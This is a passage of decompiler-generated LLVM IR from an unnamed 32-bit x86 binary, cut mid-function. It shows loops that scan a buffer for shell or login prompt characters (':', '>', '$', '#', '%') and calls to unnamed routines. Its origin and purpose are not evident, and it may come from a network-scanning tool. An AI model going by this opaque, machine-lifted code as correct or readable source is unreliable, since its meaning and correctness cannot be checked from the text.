  %v1_804eb58 = add i32 %v0_804f21f, -1
  %v8_804eb58 = icmp eq i32 %v1_804eb58, 0
  store i32 %v1_804eb58, i32* %eax.global-to-local, align 4
  %v1_804eb59 = icmp eq i1 %v8_804eb58, false
  br i1 %v1_804eb59, label %dec_label_pc_804eb27, label %dec_label_pc_804f22b

dec_label_pc_804eb60:                             ; preds = %dec_label_pc_804ea62
  %v1_804eb60 = add i32 %v0_804ea62, 24
  %v2_804eb60 = inttoptr i32 %v1_804eb60 to i32*
  %v3_804eb60 = load i32, i32* %v2_804eb60, align 4
  %v1_804eb63 = add i32 %v3_804eb60, -1
  store i32 %v1_804eb63, i32* %eax.global-to-local, align 4
  %tmp111 = icmp slt i32 %v1_804eb63, 1
  br i1 %tmp111, label %dec_label_pc_804f0f5, label %dec_label_pc_804eb6c.preheader

dec_label_pc_804eb6c.preheader:                   ; preds = %dec_label_pc_804eb60
  %v7_804eb6c.pre = load i32, i32* @edx, align 4
  %v2_804eb6c = add i32 %v0_804ea62, 28
  br label %dec_label_pc_804eb6c

dec_label_pc_804eb6c:                             ; preds = %dec_label_pc_804eb6c.preheader, %dec_label_pc_804eb94
  %v7_804eb6c = phi i32 [ %v7_804eb6c.pre, %dec_label_pc_804eb6c.preheader ], [ %v9_804eb6c, %dec_label_pc_804eb94 ]
  %v0_804f0e9 = phi i32 [ %v1_804eb63, %dec_label_pc_804eb6c.preheader ], [ %v1_804eb94, %dec_label_pc_804eb94 ]
  %v3_804eb6c = add i32 %v2_804eb6c, %v0_804f0e9
  %v4_804eb6c = inttoptr i32 %v3_804eb6c to i8*
  %v5_804eb6c = load i8, i8* %v4_804eb6c, align 1
  %v6_804eb6c = zext i8 %v5_804eb6c to i32
  %v8_804eb6c = and i32 %v7_804eb6c, -256
  %v9_804eb6c = or i32 %v6_804eb6c, %v8_804eb6c
  store i32 %v9_804eb6c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804eb6c, label %dec_label_pc_804eb94 [
    i8 58, label %dec_label_pc_804f0e9
    i8 62, label %dec_label_pc_804f0e9
    i8 36, label %dec_label_pc_804f0e9
    i8 35, label %dec_label_pc_804f0e9
  ]

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb6c
  %v1_804eb94 = add i32 %v0_804f0e9, -1
  %v8_804eb94 = icmp eq i32 %v1_804eb94, 0
  store i32 %v1_804eb94, i32* %eax.global-to-local, align 4
  %v1_804eb95 = icmp eq i1 %v8_804eb94, false
  br i1 %v1_804eb95, label %dec_label_pc_804eb6c, label %dec_label_pc_804f0f5

dec_label_pc_804eba0:                             ; preds = %dec_label_pc_804ea62
  %v1_804eba0 = add i32 %v0_804ea62, 24
  %v2_804eba0 = inttoptr i32 %v1_804eba0 to i32*
  %v3_804eba0 = load i32, i32* %v2_804eba0, align 4
  %v1_804eba3 = add i32 %v3_804eba0, -1
  store i32 %v1_804eba3, i32* %eax.global-to-local, align 4
  %tmp112 = icmp slt i32 %v1_804eba3, 1
  br i1 %tmp112, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ebac.preheader

dec_label_pc_804ebac.preheader:                   ; preds = %dec_label_pc_804eba0
  %v7_804ebac.pre = load i32, i32* @edx, align 4
  %v2_804ebac = add i32 %v0_804ea62, 28
  br label %dec_label_pc_804ebac

dec_label_pc_804ebac:                             ; preds = %dec_label_pc_804ebac.preheader, %dec_label_pc_804ebdd
  %v7_804ebac = phi i32 [ %v7_804ebac.pre, %dec_label_pc_804ebac.preheader ], [ %v9_804ebac, %dec_label_pc_804ebdd ]
  %v0_804f070 = phi i32 [ %v1_804eba3, %dec_label_pc_804ebac.preheader ], [ %v1_804ebdd, %dec_label_pc_804ebdd ]
  %v3_804ebac = add i32 %v2_804ebac, %v0_804f070
  %v4_804ebac = inttoptr i32 %v3_804ebac to i8*
  %v5_804ebac = load i8, i8* %v4_804ebac, align 1
  %v6_804ebac = zext i8 %v5_804ebac to i32
  %v8_804ebac = and i32 %v7_804ebac, -256
  %v9_804ebac = or i32 %v6_804ebac, %v8_804ebac
  store i32 %v9_804ebac, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ebac, label %dec_label_pc_804ebdd [
    i8 58, label %dec_label_pc_804f070
    i8 62, label %dec_label_pc_804f070
    i8 36, label %dec_label_pc_804f070
    i8 35, label %dec_label_pc_804f070
    i8 37, label %dec_label_pc_804f070
  ]

dec_label_pc_804ebdd:                             ; preds = %dec_label_pc_804ebac
  %v1_804ebdd = add i32 %v0_804f070, -1
  %v8_804ebdd = icmp eq i32 %v1_804ebdd, 0
  store i32 %v1_804ebdd, i32* %eax.global-to-local, align 4
  %v1_804ebde = icmp eq i1 %v8_804ebdd, false
  br i1 %v1_804ebde, label %dec_label_pc_804ebac, label %dec_label_pc_804e9ec.backedge

dec_label_pc_804ebe5:                             ; preds = %dec_label_pc_804ea62
  %v1_804ebe5 = add i32 %v0_804ea62, 24
  %v2_804ebe5 = inttoptr i32 %v1_804ebe5 to i32*
  %v3_804ebe5 = load i32, i32* %v2_804ebe5, align 4
  %v1_804ebe8 = add i32 %v3_804ebe5, -1
  store i32 %v1_804ebe8, i32* %eax.global-to-local, align 4
  %tmp113 = icmp slt i32 %v1_804ebe8, 1
  br i1 %tmp113, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ebf1.preheader

dec_label_pc_804ebf1.preheader:                   ; preds = %dec_label_pc_804ebe5
  %v7_804ebf1.pre = load i32, i32* @edx, align 4
  %v2_804ebf1 = add i32 %v0_804ea62, 28
  br label %dec_label_pc_804ebf1

dec_label_pc_804ebf1:                             ; preds = %dec_label_pc_804ebf1.preheader, %dec_label_pc_804ec22
  %v7_804ebf1 = phi i32 [ %v7_804ebf1.pre, %dec_label_pc_804ebf1.preheader ], [ %v9_804ebf1, %dec_label_pc_804ec22 ]
  %v0_804f1a2 = phi i32 [ %v1_804ebe8, %dec_label_pc_804ebf1.preheader ], [ %v1_804ec22, %dec_label_pc_804ec22 ]
  %v3_804ebf1 = add i32 %v2_804ebf1, %v0_804f1a2
  %v4_804ebf1 = inttoptr i32 %v3_804ebf1 to i8*
  %v5_804ebf1 = load i8, i8* %v4_804ebf1, align 1
  %v6_804ebf1 = zext i8 %v5_804ebf1 to i32
  %v8_804ebf1 = and i32 %v7_804ebf1, -256
  %v9_804ebf1 = or i32 %v6_804ebf1, %v8_804ebf1
  store i32 %v9_804ebf1, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ebf1, label %dec_label_pc_804ec22 [
    i8 58, label %dec_label_pc_804f1a2
    i8 62, label %dec_label_pc_804f1a2
    i8 36, label %dec_label_pc_804f1a2
    i8 35, label %dec_label_pc_804f1a2
    i8 37, label %dec_label_pc_804f1a2
  ]

dec_label_pc_804ec22:                             ; preds = %dec_label_pc_804ebf1
  %v1_804ec22 = add i32 %v0_804f1a2, -1
  %v8_804ec22 = icmp eq i32 %v1_804ec22, 0
  store i32 %v1_804ec22, i32* %eax.global-to-local, align 4
  %v1_804ec23 = icmp eq i1 %v8_804ec22, false
  br i1 %v1_804ec23, label %dec_label_pc_804ebf1, label %dec_label_pc_804e9ec.backedge

dec_label_pc_804ec30:                             ; preds = %dec_label_pc_804ea62
  %v1_804ec30 = add i32 %v0_804ea62, 24
  %v2_804ec30 = inttoptr i32 %v1_804ec30 to i32*
  %v3_804ec30 = load i32, i32* %v2_804ec30, align 4
  %v1_804ec33 = add i32 %v3_804ec30, -1
  store i32 %v1_804ec33, i32* %eax.global-to-local, align 4
  %tmp114 = icmp slt i32 %v1_804ec33, 1
  br i1 %tmp114, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ec3c

dec_label_pc_804ec3c:                             ; preds = %dec_label_pc_804ec30
  %v2_804ec3c = add i32 %v0_804ea62, 27
  %v3_804ec3c = add i32 %v2_804ec3c, %v3_804ec30
  %v4_804ec3c = inttoptr i32 %v3_804ec3c to i8*
  %v5_804ec3c = load i8, i8* %v4_804ec3c, align 1
  %v6_804ec3c = zext i8 %v5_804ec3c to i32
  %v7_804ec3c = load i32, i32* @edx, align 4
  %v8_804ec3c = and i32 %v7_804ec3c, -256
  %v9_804ec3c = or i32 %v8_804ec3c, %v6_804ec3c
  store i32 %v9_804ec3c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804ec3c, label %dec_label_pc_804ec4a [
    i8 62, label %dec_label_pc_804ec6e
    i8 58, label %dec_label_pc_804ec6e
  ]

dec_label_pc_804ec4a:                             ; preds = %dec_label_pc_804ec3c, %dec_label_pc_804ec60
  %v0_804ec59 = phi i32 [ %v1_804ec59, %dec_label_pc_804ec60 ], [ %v1_804ec33, %dec_label_pc_804ec3c ]
  %v7_804ec60 = phi i32 [ %v9_804ec60, %dec_label_pc_804ec60 ], [ %v9_804ec3c, %dec_label_pc_804ec3c ]
  %v1_804ec4a = trunc i32 %v7_804ec60 to i8
  %v1_804ec4a.off = add i8 %v1_804ec4a, -35
  %switch146 = icmp ult i8 %v1_804ec4a.off, 3
  br i1 %switch146, label %dec_label_pc_804ec6e, label %dec_label_pc_804ec59

dec_label_pc_804ec59:                             ; preds = %dec_label_pc_804ec4a
  %v1_804ec59 = add i32 %v0_804ec59, -1
  %v8_804ec59 = icmp eq i32 %v1_804ec59, 0
  store i32 %v1_804ec59, i32* %eax.global-to-local, align 4
  br i1 %v8_804ec59, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ec60

dec_label_pc_804ec60:                             ; preds = %dec_label_pc_804ec59
  %v3_804ec60 = add i32 %v2_804ec3c, %v0_804ec59
  %v4_804ec60 = inttoptr i32 %v3_804ec60 to i8*
  %v5_804ec60 = load i8, i8* %v4_804ec60, align 1
  %v6_804ec60 = zext i8 %v5_804ec60 to i32
  %v8_804ec60 = and i32 %v7_804ec60, -256
  %v9_804ec60 = or i32 %v6_804ec60, %v8_804ec60
  store i32 %v9_804ec60, i32* %edx.global-to-local, align 4
  %v10_804ec64 = icmp ne i8 %v5_804ec60, 58
  %v10_804ec69 = icmp eq i8 %v5_804ec60, 62
  %v1_804ec6c = icmp eq i1 %v10_804ec69, false
  %or.cond143 = and i1 %v10_804ec64, %v1_804ec6c
  br i1 %or.cond143, label %dec_label_pc_804ec4a, label %dec_label_pc_804ec6e

dec_label_pc_804ec6e:                             ; preds = %dec_label_pc_804ec4a, %dec_label_pc_804ec60, %dec_label_pc_804ec3c, %dec_label_pc_804ec3c
  %v0_804ec6e = phi i32 [ %v1_804ec33, %dec_label_pc_804ec3c ], [ %v1_804ec33, %dec_label_pc_804ec3c ], [ %v0_804ec59, %dec_label_pc_804ec4a ], [ %v1_804ec59, %dec_label_pc_804ec60 ]
  %v1_804ec6e = add i32 %v0_804ec6e, 1
  store i32 %v1_804ec6e, i32* %eax.global-to-local, align 4
  %v1_804ec6f = load i32, i32* @esp, align 4
  %v2_804ec6f = add i32 %v1_804ec6f, 32
  %v3_804ec6f = inttoptr i32 %v2_804ec6f to i32*
  store i32 %v1_804ec6e, i32* %v3_804ec6f, align 4
  %v0_804ec73 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec73 = add i32 %v0_804ec73, 1
  %v8_804ec73 = icmp eq i32 %v1_804ec73, 0
  store i32 %v1_804ec73, i32* %eax.global-to-local, align 4
  br i1 %v8_804ec73, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804ec7a

dec_label_pc_804ec7a:                             ; preds = %dec_label_pc_804ec6e
  %v0_804ec7a = load i32, i32* @esp, align 4
  %v1_804ec7a = add i32 %v0_804ec7a, 32
  %v2_804ec7a = inttoptr i32 %v1_804ec7a to i32*
  %v3_804ec7a = load i32, i32* %v2_804ec7a, align 4
  store i32 %v3_804ec7a, i32* @esi, align 4
  %tmp115 = icmp slt i32 %v3_804ec7a, 1
  br i1 %tmp115, label %dec_label_pc_804f058, label %dec_label_pc_804ec86

dec_label_pc_804ec86:                             ; preds = %dec_label_pc_804ec7a
  %v1_804ec89 = add i32 %v0_804ec7a, -16
  %v2_804ec89 = inttoptr i32 %v1_804ec89 to i32*
  store i32 6, i32* %v2_804ec89, align 4
  %v0_804ec8b = call i32 @function_804f760()
  store i32 %v0_804ec8b, i32* %eax.global-to-local, align 4
  %v0_804ec90 = load i32, i32* @esp, align 4
  %v1_804ec90 = inttoptr i32 %v0_804ec90 to i32*
  %v2_804ec90 = load i32, i32* %v1_804ec90, align 4
  store i32 %v2_804ec90, i32* %ecx.global-to-local, align 4
  %v3_804ec90 = add i32 %v0_804ec90, 4
  %v1_804ec91 = inttoptr i32 %v3_804ec90 to i32*
  %v2_804ec91 = load i32, i32* %v1_804ec91, align 4
  store i32 %v2_804ec91, i32* @ebx, align 4
  %v1_804ec92 = add i32 %v0_804ec90, 1888
  store i32 %v1_804ec92, i32* %eax.global-to-local, align 4
  store i32 %v1_804ec92, i32* %v1_804ec91, align 4
  store i32 6, i32* %v1_804ec90, align 4
  %v0_804ec9c = call i32 @function_804f6b0()
  store i32 %v0_804ec9c, i32* %eax.global-to-local, align 4
  %v0_804eca1 = load i32, i32* @esp, align 4
  %v1_804eca1 = add i32 %v0_804eca1, -4
  %v2_804eca1 = inttoptr i32 %v1_804eca1 to i32*
  store i32 16384, i32* %v2_804eca1, align 4
  %v1_804eca6 = add i32 %v0_804eca1, 1888
  %v2_804eca6 = inttoptr i32 %v1_804eca6 to i32*
  %v3_804eca6 = load i32, i32* %v2_804eca6, align 4
  store i32 %v3_804eca6, i32* %edx.global-to-local, align 4
  %v2_804ecad = add i32 %v0_804eca1, -8
  %v3_804ecad = inttoptr i32 %v2_804ecad to i32*
  store i32 %v3_804eca6, i32* %v3_804ecad, align 4
  %v2_804ecae = add i32 %v0_804eca1, -12
  %v3_804ecae = inttoptr i32 %v2_804ecae to i32*
  store i32 %v0_804ec9c, i32* %v3_804ecae, align 4
  %v0_804ecaf = load i32, i32* @edi, align 4
  %v1_804ecaf = add i32 %v0_804ecaf, 4
  %v2_804ecaf = inttoptr i32 %v1_804ecaf to i32*
  %v3_804ecaf = load i32, i32* %v2_804ecaf, align 4
  store i32 %v3_804ecaf, i32* %eax.global-to-local, align 4
  %v2_804ecb2 = add i32 %v0_804eca1, -16
  %v3_804ecb2 = inttoptr i32 %v2_804ecb2 to i32*
  store i32 %v3_804ecaf, i32* %v3_804ecb2, align 4
  %v0_804ecb3 = call i32 @function_8050986()
  store i32 %v0_804ecb3, i32* %eax.global-to-local, align 4
  %v0_804ecb8 = load i32, i32* @esp, align 4
  %v1_804ecbb = add i32 %v0_804ecb8, 28
  %v2_804ecbb = inttoptr i32 %v1_804ecbb to i32*
  store i32 16384, i32* %v2_804ecbb, align 4
  %v1_804ecc0 = add i32 %v0_804ecb8, 24
  %v2_804ecc0 = inttoptr i32 %v1_804ecc0 to i32*
  store i32 2, i32* %v2_804ecc0, align 4
  %v1_804ecc2 = add i32 %v0_804ecb8, 20
  %v2_804ecc2 = inttoptr i32 %v1_804ecc2 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804ecc2, align 4
  %v0_804ecc7 = load i32, i32* @edi, align 4
  %v1_804ecc7 = add i32 %v0_804ecc7, 4
  %v2_804ecc7 = inttoptr i32 %v1_804ecc7 to i32*
  %v3_804ecc7 = load i32, i32* %v2_804ecc7, align 4
  %v2_804ecca = add i32 %v0_804ecb8, 16
  %v3_804ecca = inttoptr i32 %v2_804ecca to i32*
  store i32 %v3_804ecc7, i32* %v3_804ecca, align 4
  %v0_804eccb = call i32 @function_8050986()
  store i32 %v0_804eccb, i32* %eax.global-to-local, align 4
  %v0_804ecd0 = load i32, i32* @esp, align 4
  %v1_804ecd0 = inttoptr i32 %v0_804ecd0 to i32*
  store i32 6, i32* %v1_804ecd0, align 4
  %v0_804ecd7 = call i32 @function_804f6e0()
  store i32 %v0_804ecd7, i32* %eax.global-to-local, align 4
  %v0_804ecdf = load i32, i32* @edi, align 4
  %v1_804ecdf = add i32 %v0_804ecdf, 12
  %v2_804ecdf = inttoptr i32 %v1_804ecdf to i32*
  store i32 7, i32* %v2_804ecdf, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804eceb:                             ; preds = %dec_label_pc_804ea62
  %v0_804eceb = load i32, i32* @esp, align 4
  %v1_804ecee = add i32 %v0_804eceb, -16
  %v2_804ecee = inttoptr i32 %v1_804ecee to i32*
  store i32 10, i32* %v2_804ecee, align 4
  %v0_804ecf0 = call i32 @function_804f760()
  store i32 %v0_804ecf0, i32* %eax.global-to-local, align 4
  %v0_804ecf5 = load i32, i32* @esp, align 4
  %v1_804ecf5 = inttoptr i32 %v0_804ecf5 to i32*
  %v2_804ecf5 = load i32, i32* %v1_804ecf5, align 4
  store i32 %v2_804ecf5, i32* %eax.global-to-local, align 4
  %v3_804ecf5 = add i32 %v0_804ecf5, 4
  %v1_804ecf6 = inttoptr i32 %v3_804ecf5 to i32*
  %v2_804ecf6 = load i32, i32* %v1_804ecf6, align 4
  store i32 %v2_804ecf6, i32* %edx.global-to-local, align 4
  %v1_804ecf7 = add i32 %v0_804ecf5, 1880
  store i32 %v1_804ecf7, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ecf7, i32* %v1_804ecf6, align 4
  store i32 10, i32* %v1_804ecf5, align 4
  %v0_804ed01 = call i32 @function_804f6b0()
  store i32 %v0_804ed01, i32* %eax.global-to-local, align 4
  %v0_804ed06 = load i32, i32* @esp, align 4
  %v1_804ed06 = add i32 %v0_804ed06, 1880
  %v2_804ed06 = inttoptr i32 %v1_804ed06 to i32*
  %v3_804ed06 = load i32, i32* %v2_804ed06, align 4
  %v1_804ed0d = add i32 %v3_804ed06, -1
  store i32 %v1_804ed0d, i32* %edx.global-to-local, align 4
  %v2_804ed0e = add i32 %v0_804ed06, -4
  %v3_804ed0e = inttoptr i32 %v2_804ed0e to i32*
  store i32 %v1_804ed0d, i32* %v3_804ed0e, align 4
  %v2_804ed0f = add i32 %v0_804ed06, -8
  %v3_804ed0f = inttoptr i32 %v2_804ed0f to i32*
  store i32 %v0_804ed01, i32* %v3_804ed0f, align 4
  %v0_804ed10 = load i32, i32* @edi, align 4
  %v1_804ed10 = add i32 %v0_804ed10, 24
  %v2_804ed10 = inttoptr i32 %v1_804ed10 to i32*
  %v3_804ed10 = load i32, i32* %v2_804ed10, align 4
  store i32 %v3_804ed10, i32* %eax.global-to-local, align 4
  %v2_804ed13 = add i32 %v0_804ed06, -12
  %v3_804ed13 = inttoptr i32 %v2_804ed13 to i32*
  store i32 %v3_804ed10, i32* %v3_804ed13, align 4
  %v1_804ed14 = add i32 %v0_804ed06, 32
  %v2_804ed14 = inttoptr i32 %v1_804ed14 to i32*
  %v3_804ed14 = load i32, i32* %v2_804ed14, align 4
  store i32 %v3_804ed14, i32* %eax.global-to-local, align 4
  %v2_804ed18 = add i32 %v0_804ed06, -16
  %v3_804ed18 = inttoptr i32 %v2_804ed18 to i32*
  store i32 %v3_804ed14, i32* %v3_804ed18, align 4
  %v0_804ed19 = call i32 @function_804fde0()
  %v0_804ed1e = load i32, i32* @esp, align 4
  %v1_804ed21 = add i32 %v0_804ed19, 1
  %v8_804ed21 = icmp eq i32 %v1_804ed21, 0
  store i32 %v1_804ed21, i32* %eax.global-to-local, align 4
  %v1_804f374 = add i32 %v0_804ed1e, 16
  %v2_804f374 = inttoptr i32 %v1_804f374 to i32*
  store i32 10, i32* %v2_804f374, align 4
  %v0_804f376 = call i32 @function_804f6e0()
  store i32 %v0_804f376, i32* %eax.global-to-local, align 4
  %v0_804f37b = load i32, i32* @esp, align 4
  %v1_804f37b = inttoptr i32 %v0_804f37b to i32*
  br i1 %v8_804ed21, label %dec_label_pc_804f371, label %dec_label_pc_804ed28

dec_label_pc_804ed28:                             ; preds = %dec_label_pc_804eceb
  %v2_804ed32 = load i32, i32* %v1_804f37b, align 4
  store i32 %v2_804ed32, i32* %eax.global-to-local, align 4
  %v0_804ed33 = load i32, i32* @edi, align 4
  %v1_804ed33 = add i32 %v0_804ed33, 4
  %v2_804ed33 = inttoptr i32 %v1_804ed33 to i32*
  %v3_804ed33 = load i32, i32* %v2_804ed33, align 4
  store i32 %v3_804ed33, i32* %eax.global-to-local, align 4
  store i32 %v3_804ed33, i32* %v1_804f37b, align 4
  %v1_804ed37 = call i32 @function_8050253(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ed37, i32* %eax.global-to-local, align 4
  %v0_804ed3c = load i32, i32* @edi, align 4
  %v1_804ed3c = add i32 %v0_804ed3c, 284
  %v2_804ed3c = inttoptr i32 %v1_804ed3c to i8*
  %v3_804ed3c = load i8, i8* %v2_804ed3c, align 1
  %v4_804ed3c = zext i8 %v3_804ed3c to i32
  %v6_804ed3c = and i32 %v1_804ed37, -256
  %v7_804ed3c = or i32 %v4_804ed3c, %v6_804ed3c
  %v1_804ed45 = add i32 %v7_804ed3c, 1
  store i32 %v1_804ed45, i32* %eax.global-to-local, align 4
  %v1_804ed46 = add i32 %v0_804ed3c, 4
  %v2_804ed46 = inttoptr i32 %v1_804ed46 to i32*
  store i32 -1, i32* %v2_804ed46, align 4
  %v0_804ed4d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed4d = trunc i32 %v0_804ed4d to i8
  %v2_804ed4d = load i32, i32* @edi, align 4
  %v3_804ed4d = add i32 %v2_804ed4d, 284
  %v4_804ed4d = inttoptr i32 %v3_804ed4d to i8*
  store i8 %v1_804ed4d, i8* %v4_804ed4d, align 1
  %v0_804ed53 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed53 = trunc i32 %v0_804ed53 to i8
  %v10_804ed53 = icmp eq i8 %v1_804ed53, 10
  %v1_804ed55 = icmp eq i1 %v10_804ed53, false
  %v0_804f34b = load i32, i32* @edi, align 4
  br i1 %v1_804ed55, label %dec_label_pc_804f34b, label %dec_label_pc_804ed5b

dec_label_pc_804ed5b:                             ; preds = %dec_label_pc_804ed28
  %v1_804ed5b = add i32 %v0_804f34b, 284
  %v2_804ed5b = inttoptr i32 %v1_804ed5b to i8*
  store i8 0, i8* %v2_804ed5b, align 1
  %v0_804ed62 = load i32, i32* @edi, align 4
  %v1_804ed62 = add i32 %v0_804ed62, 12
  %v2_804ed62 = inttoptr i32 %v1_804ed62 to i32*
  store i32 0, i32* %v2_804ed62, align 4
  %v0_804ed69 = load i32, i32* @esp, align 4
  %v1_804ed69 = add i32 %v0_804ed69, 32
  %v2_804ed69 = inttoptr i32 %v1_804ed69 to i32*
  store i32 -1, i32* %v2_804ed69, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804ed71:                             ; preds = %dec_label_pc_804f058, %dec_label_pc_804eeb1, %dec_label_pc_804edf6, %dec_label_pc_804f400, %dec_label_pc_804f34b, %dec_label_pc_804ec86, %dec_label_pc_804f1ba, %dec_label_pc_804f084, %dec_label_pc_804f164, %dec_label_pc_804f2f3, %dec_label_pc_804eb0f, %dec_label_pc_804ed5b
  %v0_804ed71 = load i32, i32* @edi, align 4
  %v1_804ed71 = add i32 %v0_804ed71, 24
  %v2_804ed71 = inttoptr i32 %v1_804ed71 to i32*
  %v3_804ed71 = load i32, i32* %v2_804ed71, align 4
  store i32 %v3_804ed71, i32* @edx, align 4
  store i32 %v3_804ed71, i32* %eax.global-to-local, align 4
  %v1_804ed76 = load i32, i32* @esp, align 4
  %v2_804ed76 = add i32 %v1_804ed76, 32
  %v3_804ed76 = inttoptr i32 %v2_804ed76 to i32*
  %v4_804ed76 = load i32, i32* %v3_804ed76, align 4
  %v5_804ed76 = sub i32 %v3_804ed71, %v4_804ed76
  %v11_804ed76 = xor i32 %v4_804ed76, %v3_804ed71
  %v12_804ed76 = xor i32 %v5_804ed76, %v3_804ed71
  %v13_804ed76 = and i32 %v12_804ed76, %v11_804ed76
  %v14_804ed76 = icmp slt i32 %v13_804ed76, 0
  %v15_804ed76 = icmp eq i32 %v5_804ed76, 0
  %v16_804ed76 = icmp slt i32 %v5_804ed76, 0
  %v3_804ed7a = icmp ne i1 %v16_804ed76, %v14_804ed76
  %v4_804ed7a = or i1 %v15_804ed76, %v3_804ed7a
  br i1 %v4_804ed7a, label %dec_label_pc_804ed80, label %dec_label_pc_804ed7c

dec_label_pc_804ed7c:                             ; preds = %dec_label_pc_804ed71
  store i32 %v4_804ed76, i32* @edx, align 4
  br label %dec_label_pc_804ed80

dec_label_pc_804ed80:                             ; preds = %dec_label_pc_804ed71, %dec_label_pc_804ed7c
  %v1_804ed80 = phi i32 [ %v3_804ed71, %dec_label_pc_804ed71 ], [ %v4_804ed76, %dec_label_pc_804ed7c ]
  %v2_804ed80 = sub i32 %v3_804ed71, %v1_804ed80
  store i32 %v2_804ed80, i32* %eax.global-to-local, align 4
  store i32 %v2_804ed80, i32* %v2_804ed71, align 4
  %v0_804ed85 = load i32, i32* @esi, align 4
  %v1_804ed85 = load i32, i32* @esp, align 4
  %v2_804ed85 = add i32 %v1_804ed85, -4
  %v3_804ed85 = inttoptr i32 %v2_804ed85 to i32*
  store i32 %v0_804ed85, i32* %v3_804ed85, align 4
  %v0_804ed86 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ed86 = add i32 %v1_804ed85, -8
  %v3_804ed86 = inttoptr i32 %v2_804ed86 to i32*
  store i32 %v0_804ed86, i32* %v3_804ed86, align 4
  %v1_804ed87 = add i32 %v1_804ed85, 16
  %v2_804ed87 = inttoptr i32 %v1_804ed87 to i32*
  %v3_804ed87 = load i32, i32* %v2_804ed87, align 4
  %v1_804ed8b = load i32, i32* @edx, align 4
  %v2_804ed8b = add i32 %v1_804ed8b, %v3_804ed87
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v2_804ed8d = add i32 %v1_804ed85, -12
  %v3_804ed8d = inttoptr i32 %v2_804ed8d to i32*
  store i32 %v2_804ed8b, i32* %v3_804ed8d, align 4
  %v3_804ed8e = load i32, i32* %v2_804ed87, align 4
  store i32 %v3_804ed8e, i32* @ebx, align 4
  %v2_804ed92 = add i32 %v1_804ed85, -16
  %v3_804ed92 = inttoptr i32 %v2_804ed92 to i32*
  store i32 %v3_804ed8e, i32* %v3_804ed92, align 4
  %v4_804ed93 = call i32 @function_80507b5(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ed93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea62

dec_label_pc_804eda0:                             ; preds = %dec_label_pc_804ea62
  %v1_804eda0 = add i32 %v0_804ea62, 24
  %v2_804eda0 = inttoptr i32 %v1_804eda0 to i32*
  %v3_804eda0 = load i32, i32* %v2_804eda0, align 4
  %v1_804eda3 = add i32 %v3_804eda0, -1
  store i32 %v1_804eda3, i32* %eax.global-to-local, align 4
  %tmp116 = icmp slt i32 %v1_804eda3, 1
  br i1 %tmp116, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804edac

dec_label_pc_804edac:                             ; preds = %dec_label_pc_804eda0
  %v2_804edac = add i32 %v0_804ea62, 27
  %v3_804edac = add i32 %v2_804edac, %v3_804eda0
  %v4_804edac = inttoptr i32 %v3_804edac to i8*
  %v5_804edac = load i8, i8* %v4_804edac, align 1
  %v6_804edac = zext i8 %v5_804edac to i32
  %v7_804edac = load i32, i32* @edx, align 4
  %v8_804edac = and i32 %v7_804edac, -256
  %v9_804edac = or i32 %v8_804edac, %v6_804edac
  store i32 %v9_804edac, i32* %edx.global-to-local, align 4
  switch i8 %v5_804edac, label %dec_label_pc_804edba [
    i8 62, label %dec_label_pc_804edde
    i8 58, label %dec_label_pc_804edde
  ]

dec_label_pc_804edba:                             ; preds = %dec_label_pc_804edac, %dec_label_pc_804edd0
  %v0_804edc9 = phi i32 [ %v1_804edc9, %dec_label_pc_804edd0 ], [ %v1_804eda3, %dec_label_pc_804edac ]
  %v7_804edd0 = phi i32 [ %v9_804edd0, %dec_label_pc_804edd0 ], [ %v9_804edac, %dec_label_pc_804edac ]
  %v1_804edba = trunc i32 %v7_804edd0 to i8
  %v1_804edba.off = add i8 %v1_804edba, -35
  %switch147 = icmp ult i8 %v1_804edba.off, 3
  br i1 %switch147, label %dec_label_pc_804edde, label %dec_label_pc_804edc9

dec_label_pc_804edc9:                             ; preds = %dec_label_pc_804edba
  %v1_804edc9 = add i32 %v0_804edc9, -1
  %v8_804edc9 = icmp eq i32 %v1_804edc9, 0
  store i32 %v1_804edc9, i32* %eax.global-to-local, align 4
  br i1 %v8_804edc9, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804edd0

dec_label_pc_804edd0:                             ; preds = %dec_label_pc_804edc9
  %v3_804edd0 = add i32 %v2_804edac, %v0_804edc9
  %v4_804edd0 = inttoptr i32 %v3_804edd0 to i8*
  %v5_804edd0 = load i8, i8* %v4_804edd0, align 1
  %v6_804edd0 = zext i8 %v5_804edd0 to i32
  %v8_804edd0 = and i32 %v7_804edd0, -256
  %v9_804edd0 = or i32 %v6_804edd0, %v8_804edd0
  store i32 %v9_804edd0, i32* %edx.global-to-local, align 4
  %v10_804edd4 = icmp ne i8 %v5_804edd0, 58
  %v10_804edd9 = icmp eq i8 %v5_804edd0, 62
  %v1_804eddc = icmp eq i1 %v10_804edd9, false
  %or.cond144 = and i1 %v10_804edd4, %v1_804eddc
  br i1 %or.cond144, label %dec_label_pc_804edba, label %dec_label_pc_804edde

dec_label_pc_804edde:                             ; preds = %dec_label_pc_804edba, %dec_label_pc_804edd0, %dec_label_pc_804edac, %dec_label_pc_804edac
  %v0_804edde = phi i32 [ %v1_804eda3, %dec_label_pc_804edac ], [ %v1_804eda3, %dec_label_pc_804edac ], [ %v0_804edc9, %dec_label_pc_804edba ], [ %v1_804edc9, %dec_label_pc_804edd0 ]
  %v1_804edde = add i32 %v0_804edde, 1
